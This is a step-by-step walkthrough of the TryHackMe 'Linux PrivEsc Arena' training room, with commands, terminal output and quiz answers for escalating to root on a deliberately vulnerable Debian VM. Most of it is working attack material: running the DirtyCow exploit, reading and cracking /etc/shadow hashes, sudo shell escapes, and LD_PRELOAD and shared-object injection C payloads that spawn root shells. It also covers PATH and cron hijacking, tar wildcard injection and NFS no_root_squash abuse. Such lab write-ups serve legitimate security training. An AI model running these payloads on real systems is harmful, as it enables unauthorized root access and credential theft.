# Linux PrivEsc Arena

Students will learn how to escalate privileges using a very vulnerable Linux VM. SSH is open. Your credentials are TCM:Hacker123

[Linux PrivEsc Arena](https://tryhackme.com/room/linuxprivescarena)

## Topic's

* Kernel Exploits
* Stored Passwords & Keys
* Misconfigured Binaries
* Abusing SUID/GUID
* Capabilities
* Exploiting Crontab
* NFS Enumaration

## [Optional] Connecting to the TryHackMe network

You can either use the browser-based terminal (which appears when you deploy the machine), or you can connect to TryHackMe's network (via OpenVPN) and SSH in directly. If you've not done this before, first complete the [OpenVPN room](https://tryhackme.com/room/openvpn) and learn how to connect.

---

1. Read the above. 

`No answer needed`

## Deploy the vulnerable machine

This room will teach you a variety of Linux privilege escalation tactics, including kernel exploits, sudo attacks, SUID attacks, scheduled task attacks, and more. This lab was built utilizing Sagi Shahar's privesc workshop ([https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)) and utilized as part of The Cyber Mentor's Linux Privilege Escalation Udemy course ([http://udemy.com/course/linux-privilege-escalation-for-beginners](http://udemy.com/course/linux-privilege-escalation-for-beginners)).

All tools needed to complete this course are in the user folder (/home/user/tools).

Let's first connect to the machine. SSH is open on port 22. Your credentials are:

* **username**: TCM
* **password**: Hacker123

---

1. Deploy the machine and log into the user account via SSH (or use the browser-based terminal). 

`No answer needed`

## Privilege Escalation - Kernel Exploits

**Detection**

**Linux VM**

1. In command prompt type: `/home/user/tools/linux-exploit-suggester/linux-exploit-suggester.sh`
2. From the output, notice that the OS is vulnerable to “dirtycow”.

**Exploitation**

**Linux VM**

1. In command prompt type: `gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w`
2. In command prompt type: `./c0w`

*Disclaimer: This part takes 1-2 minutes - Please allow it some time to work.*

3. In command prompt type: `passwd`
4. In command prompt type: `id`

From here, either copy /tmp/passwd back to /usr/bin/passwd or reset your machine to undo changes made to the passwd binary

---

```
TCM@debian:~$ /home/user/tools/linux-exploit-suggester/linux-exploit-suggester.sh

Kernel version: 2.6.32
Architecture: x86_64
Distribution: debian
Package list: from current OS

Possible Exploits:

[+] [CVE-2010-3301] ptrace_kmod2

   Details: https://www.exploit-db.com/exploits/15023/
   Tags: debian=6,ubuntu=10.04|10.10
   Download URL: https://www.exploit-db.com/download/15023

[+] [CVE-2010-1146] reiserfs

   Details: https://www.exploit-db.com/exploits/12130/
   Tags: ubuntu=9.10
   Download URL: https://www.exploit-db.com/download/12130

[+] [CVE-2010-2959] can_bcm

   Details: https://www.exploit-db.com/exploits/14814/
   Tags: ubuntu=10.04
   Download URL: https://www.exploit-db.com/download/14814

[+] [CVE-2010-3904] rds

   Details: http://www.securityfocus.com/archive/1/514379
   Tags: debian=6,ubuntu=10.10|10.04|9.10,fedora=16
   Download URL: https://www.exploit-db.com/download/15285

[+] [CVE-2010-3848,CVE-2010-3850,CVE-2010-4073] half_nelson

   Details: https://www.exploit-db.com/exploits/17787/
   Tags: ubuntu=10.04|9.10
   Download URL: https://www.exploit-db.com/download/17787

[+] [CVE-2010-4347] american-sign-language

   Details: https://www.exploit-db.com/exploits/15774/
   Download URL: https://www.exploit-db.com/download/15774

[+] [CVE-2010-3437] pktcdvd

   Details: https://www.exploit-db.com/exploits/15150/
   Tags: ubuntu=10.04
   Download URL: https://www.exploit-db.com/download/15150

[+] [CVE-2010-3081] video4linux

   Details: https://www.exploit-db.com/exploits/15024/
   Tags: RHEL=5
   Download URL: https://www.exploit-db.com/download/15024

[+] [CVE-2012-0056,CVE-2010-3849,CVE-2010-3850] full-nelson

   Details: http://vulnfactory.org/exploits/full-nelson.c
   Tags: ubuntu=9.10|10.04|10.10,ubuntu=10.04.1
   Download URL: http://vulnfactory.org/exploits/full-nelson.c

[+] [CVE-2013-2094] perf_swevent

   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
   Tags: RHEL=6,ubuntu=12.04
   Download URL: https://www.exploit-db.com/download/26131

[+] [CVE-2013-2094] perf_swevent 2

   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
   Tags: ubuntu=12.04
   Download URL: https://cyseclabs.com/exploits/vnik_v1.c

[+] [CVE-2013-0268] msr

   Details: https://www.exploit-db.com/exploits/27297/
   Download URL: https://www.exploit-db.com/download/27297

[+] [CVE-2013-2094] semtex

   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
   Tags: RHEL=6
   Download URL: https://www.exploit-db.com/download/25444

[+] [CVE-2014-0196] rawmodePTY

   Details: http://blog.includesecurity.com/2014/06/exploit-walkthrough-cve-2014-0196-pty-kernel-race-condition.html
   Download URL: https://www.exploit-db.com/download/33516

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Tags: RHEL=5|6|7,debian=7|8,ubuntu=16.10|16.04|14.04|12.04
   Download URL: https://www.exploit-db.com/download/40611

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Tags: RHEL=5|6|7,debian=7|8,ubuntu=16.10|16.04|14.04|12.04
   Download URL: https://www.exploit-db.com/download/40616

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Tags: ubuntu=16.04
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2009-1185] udev

   Details: https://www.exploit-db.com/exploits/8572/
   Tags: ubuntu=8.10|9.04
   Download URL: https://www.exploit-db.com/download/8572
   Comments: Version<1.4.1 vulnerable but distros use own versioning scheme. Manual verification needed 

[+] [CVE-2009-1185] udev 2

   Details: https://www.exploit-db.com/exploits/8478/
   Download URL: https://www.exploit-db.com/download/8478
   Comments: SSH access to non privileged user is needed. Version<1.4.1 vulnerable but distros use own versioning scheme. Manual verification needed

[+] [CVE-2010-0832] PAM MOTD

   Details: https://www.exploit-db.com/exploits/14339/
   Tags: ubuntu=9.10|10.04
   Download URL: https://www.exploit-db.com/download/14339
   Comments: SSH access to non privileged user is needed

[+] [CVE-2016-1247] nginxed-root.sh

   Details: https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
   Tags: debian=8,ubuntu=14.04|16.04|16.10
   Download URL: https://legalhackers.com/exploits/CVE-2016-1247/nginxed-root.sh
   Comments: Rooting depends on cron.daily (up to 24h of dealy). Affected: deb8: <1.6.2; 14.04: <1.4.6; 16.04: 1.10.0
```

```
TCM@debian:~$ gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w
TCM@debian:~$ ./c0w
                                
   (___)                                   
   (o o)_____/                             
    @@ `     \                            
     \ ____, //usr/bin/passwd                          
     //    //                              
    ^^    ^^                               
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
mmap f1c02000

madvise 0

ptrace 0

TCM@debian:~$ passwd
root@debian:/home/user# id
uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
root@debian:/home/user#
```

1. Click 'Completed' once you have successfully elevated the machine

`No answer needed`

## Privilege Escalation - Stored Passwords (Config Files)

**Exploitation**

**Linux VM**

1. In command prompt type: `cat /home/user/myvpn.ovpn`
2. From the output, make note of the value of the “`auth-user-pass`” directive.
3. In command prompt type: `cat /etc/openvpn/auth.txt`
4. From the output, make note of the clear-text credentials.
5. In command prompt type: `cat /home/user/.irssi/config | grep -i passw`
6. From the output, make note of the clear-text credentials.

---

```
TCM@debian:~$ cat /home/user/myvpn.ovpn
client
dev tun
proto udp
remote 10.10.10.10 1194
resolv-retry infinite
nobind
persist-key
persist-tun
ca ca.crt
tls-client
remote-cert-tls server
auth-user-pass /etc/openvpn/auth.txt
comp-lzo
verb 1
reneg-sec 0

TCM@debian:~$ cat /etc/openvpn/auth.txt
user
password321
TCM@debian:~$
```

1. What password did you find?

`password321`

2. What user's credentials were exposed in the OpenVPN auth file?

`user`

## Privilege Escalation - Stored Passwords (History)

**Exploitation**

**Linux VM**

1. In command prompt type: `cat ~/.bash_history | grep -i passw`
2. From the output, make note of the clear-text credentials.

---

```
TCM@debian:~$ cat ~/.bash_history | grep -i passw
mysql -h somehost.local -uroot -ppassword123
cat /etc/passwd | cut -d: -f1
awk -F: '($3 == "0") {print}' /etc/passwd
```

1. What was TCM trying to log into?

`mysql`

2. Who was TCM trying to log in as?

`root`

3. Naughty naughty.  What was the password discovered?

`password123`

## Privilege Escalation - Weak File Permissions

**Detection**

**Linux VM**

1. In command prompt type: `ls -la /etc/shadow`
2. Note the file permissions

**Exploitation**

**Linux VM**

1. In command prompt type: `cat /etc/passwd`
2. Save the output to a file on your attacker machine
3. In command prompt type: `cat /etc/shadow`
4. Save the output to a file on your attacker machine

**Attacker VM**

1. In command prompt type: `unshadow <PASSWORD-FILE> <SHADOW-FILE> > unshadowed.txt`

Now, you have an unshadowed file. We already know the password, but you can use your favorite hash cracking tool to crack dem hashes.

For example: `hashcat -m 1800 unshadowed.txt rockyou.txt -O`

---

```
TCM@debian:~$ ls -la /etc/shadow
-rw-rw-r-- 1 root shadow 809 Jun 17 23:33 /etc/shadow
```

1. What were the file permissions on the /etc/shadow file? 

`-rw-rw-r--`

## Privilege Escalation - SSH Keys

**Detection**

**Linux VM**

1. In command prompt type: `find / -name authorized_keys 2> /dev/null`
2. In a command prompt type: `find / -name id_rsa 2> /dev/null`
3. Note the results.

**Exploitation**

**Linux VM**

1. Copy the contents of the discovered `id_rsa` file to a file on your attacker VM.

**Attacker VM**

1. In command prompt type: **chmod 400 id_rsa**
2. In command prompt type: **ssh -i id_rsa root@<ip>**

You should now have a root shell :)

---

```
TCM@debian:~$ find / -name authorized_keys 2> /dev/null
TCM@debian:~$ find / -name id_rsa 2> /dev/null
/backups/supersecretkeys/id_rsa
TCM@debian:~$
```

1. What's the full file path of the sensitive file you discovered?

## Privilege Escalation - Sudo (Shell Escaping)

**Detection**

**Linux VM**

1. In command prompt type: `sudo -l`
2. From the output, notice the list of programs that can run via sudo.

**Exploitation**

**Linux VM**

In command prompt type any of the following:
1. `sudo find /bin -name nano -exec /bin/sh \;`
2. `sudo awk 'BEGIN {system("/bin/sh")}'`
3. `echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse`
4. `sudo vim -c '!sh'`

---

1. Click 'Completed' once you have successfully elevated the machine

`No answer needed`

## Privilege Escalation - Sudo (Abusing Intended Functionality)

**Detection**

**Linux VM**

1. In command prompt type: `sudo -l`
2. From the output, notice the list of programs that can run via sudo.

**Exploitation**

**Linux VM**

1. In command prompt type: `sudo apache2 -f /etc/shadow`
2. From the output, copy the root hash.

**Attacker VM**

1. Open command prompt and type: `echo '[Pasted Root Hash]' > hash.txt`
2. In command prompt type: `john --wordlist=/usr/share/wordlists/nmap.lst hash.txt`
3. From the output, notice the cracked credentials.

---

1. Click 'Completed' once you have successfully elevated the machine

`No answer needed`

## Privilege Escalation - Sudo (LD_PRELOAD)

**Detection**

**Linux VM**

1. In command prompt type: `sudo -l`
2. From the output, notice that the LD_PRELOAD environment variable is intact.

**Exploitation**

1. Open a text editor and type:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

2. Save the file as `x.c`
3. In command prompt type: `gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles`
4. In command prompt type: `sudo LD_PRELOAD=/tmp/x.so apache2`
5. In command prompt type: `id`

---

1. Click 'Completed' once you have successfully elevated the machine 

`No answer needed`

## Privilege Escalation - SUID (Shared Object Injection)

**Detection**

**Linux VM**

1. In command prompt type: `find / -type f -perm -04000 -ls 2>/dev/null`
2. From the output, make note of all the SUID binaries.
3. In command line type: `strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"`
4. From the output, notice that a .so file is missing from a writable directory.

**Exploitation**

**Linux VM**

5. In command prompt type: `mkdir /home/user/.config`
6. In command prompt type: `cd /home/user/.config`
7. Open a text editor and type:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

8. Save the file as `libcalc.c`
9. In command prompt type: `gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c`
10. In command prompt type: `/usr/local/bin/suid-so`
11. In command prompt type: `id`

---

1. Click 'Completed' once you have successfully elevated the machine

`No answer needed`

## Privilege Escalation - SUID (Symlinks)

**Detection**

**Linux VM**

1. In command prompt type: `dpkg -l | grep nginx`
2. From the output, notice that the installed nginx version is below 1.6.2-5+deb8u3.

**Exploitation**

**Linux VM – Terminal 1**

1. For this exploit, it is required that the user be www-data. To simulate this escalate to root by typing: `su root`
2. The root password is `password123`
3. Once escalated to root, in command prompt type: `su -l www-data`
4. In command prompt type: `/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log`
5. At this stage, the system waits for logrotate to execute. In order to speed up the process, this will be simulated by connecting to the Linux VM via a different terminal.

**Linux VM – Terminal 2**

1. Once logged in, type: `su root`
2. The root password is `password123`
3. As root, type the following: `invoke-rc.d nginx rotate >/dev/null 2>&1`
4. Switch back to the previous terminal.

**Linux VM – Terminal 1**

1. From the output, notice that the exploit continued its execution.
2. In command prompt type: `id`

---

```
TCM@debian:~$ dpkg -l | grep nginx
ii  nginx-common                        1.6.2-5+deb8u2~bpo70+1       small, powerful, scalable web/proxy server - common files
ii  nginx-full                          1.6.2-5+deb8u2~bpo70+1       nginx web/proxy server (standard version)
```

* [Vulnerability Details : CVE-2016-1247](https://www.cvedetails.com/cve/CVE-2016-1247/)
* [Nginx (Debian Based Distros + Gentoo) - 'logrotate' Local Privilege Escalation](https://www.exploit-db.com/exploits/40768)

1. What CVE is being exploited in this task?

`CVE-2016-1247`

2. What binary is SUID enabled and assists in the attack?

```c
SUIDBIN="/usr/bin/sudo"
```

`sudo`

## Privilege Escalation - SUID (Environment Variables #1)

**Detection**

**Linux VM**

1. In command prompt type: `find / -type f -perm -04000 -ls 2>/dev/null`
2. From the output, make note of all the SUID binaries.
3. In command prompt type: `strings /usr/local/bin/suid-env`
4. From the output, notice the functions used by the binary.

**Exploitation**

**Linux VM**

1. In command prompt type: `echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c`
2. In command prompt type: `gcc /tmp/service.c -o /tmp/service`
3. In command prompt type: `export PATH=/tmp:$PATH`
4. In command prompt type: `/usr/local/bin/suid-env`
5. In command prompt type: `id`

---

```
TCM@debian:~$ strings /usr/local/bin/suid-env
/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
service apache2 start
TCM@debian:~$
```

1. What is the last line of the "strings /usr/local/bin/suid-env" output?

`service apache2 start`

## Privilege Escalation - SUID (Environment Variables #2)

**Detection**

**Linux VM**

1. In command prompt type: `find / -type f -perm -04000 -ls 2>/dev/null`
2. From the output, make note of all the SUID binaries.
3. In command prompt type: `strings /usr/local/bin/suid-env2`
4. From the output, notice the functions used by the binary.

**Exploitation Method #1**

**Linux VM**

1. In command prompt type: `function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }`
2. In command prompt type: `export -f /usr/sbin/service`
3. In command prompt type: `/usr/local/bin/suid-env2`

**Exploitation Method #2**

**Linux VM**

1. In command prompt type: `env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'`

---

```
TCM@debian:~$ strings /usr/local/bin/suid-env2
/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
/usr/sbin/service apache2 start
TCM@debian:~$
```

1. What is the last line of the "strings /usr/local/bin/suid-env2" output?

`/usr/sbin/service apache2 start`

## Privilege Escalation - Capabilities

**Detection**

**Linux VM**

1. In command prompt type: `getcap -r / 2>/dev/null`
2. From the output, notice the value of the “cap_setuid” capability.

**Exploitation**

**Linux VM**

1. In command prompt type: `/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
2. Enjoy root!

---

1. Click 'Completed' once you have successfully elevated the machine 

## Privilege Escalation - Cron (Path)

**Detection**

**Linux VM**

1. In command prompt type: `cat /etc/crontab`
2. From the output, notice the value of the “PATH” variable.

**Exploitation**

**Linux VM**

1. In command prompt type: `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh`
2. In command prompt type: `chmod +x /home/user/overwrite.sh`
3. Wait 1 minute for the Bash script to execute.
4. In command prompt type: `/tmp/bash -p`
5. In command prompt type: `id`

---

1. Click 'Completed' once you have successfully elevated the machine 

## Privilege Escalation - Cron (Wildcards)

**Detection**

**Linux VM**

1. In command prompt type: `cat /etc/crontab`
2. From the output, notice the script “/usr/local/bin/compress.sh”
3. In command prompt type: `cat /usr/local/bin/compress.sh`
4. From the output, notice the wildcard (*) used by ‘tar’.

**Exploitation**

**Linux VM**

1. In command prompt type: `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh`
2. `touch /home/user/--checkpoint=1`
3. `touch /home/user/--checkpoint-action=exec=sh\ runme.sh`
4. Wait 1 minute for the Bash script to execute.
5. In command prompt type: `/tmp/bash -p`
6. In command prompt type: `id`

---

1. Click 'Completed' once you have successfully elevated the machine 

## Privilege Escalation - Cron (File Overwrite)

**Detection**

**Linux VM**

1. In command prompt type: `cat /etc/crontab`
2. From the output, notice the script “overwrite.sh”
3. In command prompt type: `ls -l /usr/local/bin/overwrite.sh`
4. From the output, notice the file permissions.

**Exploitation**

**Linux VM**

1. In command prompt type: `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh`
2. Wait 1 minute for the Bash script to execute.
3. In command prompt type: `/tmp/bash -p`
4. In command prompt type: `id`

---

1. Click 'Completed' once you have successfully elevated the machine 

## Privilege Escalation - NFS Root Squashing

**Detection**

**Linux VM**

1. In command line type: `cat /etc/exports`
2. From the output, notice that “no_root_squash” option is defined for the “/tmp” export.

**Exploitation**

**Attacker VM**

1. Open command prompt and type: `showmount -e MACHINE_IP`
2. In command prompt type: `mkdir /tmp/1`
3. In command prompt type: `mount -o rw,vers=2 MACHINE_IP:/tmp /tmp/1`
4. In command prompt type: `echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c`
5. In command prompt type: `gcc /tmp/1/x.c -o /tmp/1/x`
6. In command prompt type: `chmod +s /tmp/1/x`

**Linux VM**

1. In command prompt type: `/tmp/x`
2. In command prompt type: `id`

---

1. Click 'Completed' once you have successfully elevated the machine
